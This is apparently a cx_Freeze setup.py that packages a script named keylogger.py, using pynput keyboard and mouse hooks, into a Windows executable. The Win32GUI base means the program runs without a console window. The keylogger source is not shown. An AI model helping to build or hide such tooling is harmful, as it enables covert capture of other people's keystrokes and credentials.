import sys
from cx_Freeze import setup, Executable

# Dependencies
build_exe_options = {
    "packages": [
        "pynput",
        "datetime",
        "os",
        "sys",
        "time",
        "threading",
        "random",
        "string",
        "queue",
        "ctypes"
    ],
    "includes": [
        "queue",
        "pynput.keyboard",
        "pynput.mouse"
    ],
    "excludes": [],
    "include_files": [],
    "include_msvcr": True
}

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name="Keylogger",
    version="1.0",
    description="Keylogger Application",
    options={"build_exe": build_exe_options},
    executables=[
        Executable(
            "keylogger.py",
            base=base,
            target_name="keylogger.exe"
        )
    ]
) 